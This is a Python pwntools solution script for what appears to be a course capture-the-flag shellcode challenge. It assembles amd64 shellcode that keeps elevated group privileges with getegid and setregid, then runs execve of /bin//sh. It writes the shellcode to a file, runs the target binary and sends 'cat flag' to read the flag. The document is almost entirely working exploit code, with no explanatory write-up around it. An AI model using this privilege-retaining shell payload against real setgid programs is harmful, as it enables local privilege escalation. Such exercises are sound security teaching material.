from pwn import *
from pwn import asm, context, gdb, process
context .clear(arch="amd64")
context.terminal = ["tmux", 'splitw','-h']

shellcode = asm(
    """
mov rax, 108; syscall /* Result in rax* /
/* Call setregid with that result: */
mov rdi, rax
mov rsi, rax
mov rax, 114; syscall 

/* Build the string /bin/sh somewhere (often by pushing onto the stack). */
/*push    0x68732f2f */         /* "//sh" */
/*push    0x6e69622f */        /* "/bin" */
/* /bin/sh -> 2f62696e2f7368 -> 68 73 2f 6e 69 62 2f
/*  */
push 0  /* create a null byte */
mov     rbx, 0x68732f2f6e69622f   /* bytes in memory: "/bin//sh"*/
push    rbx /* Pushes that 8-byte value onto the stack */
mov     rdi, rsp /* execveâ€™s first argument */
mov     rsi, 0 /* second syscall argument */
mov     rdx, 0 /* third syscall argument */
mov     rax, 59 /* kernel executes execve */
syscall
    """
)
outpath = os.path.abspath("shellcode.bin")
with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
p = process(['./02-shellcode-64'], env={'PATH':'/bin:/usr/bin'})
p.sendline(b"cat flag")
flag = p.recvline_regex(b"[Cc][Ss]6332{.*}").decode()
print("Flag:", flag)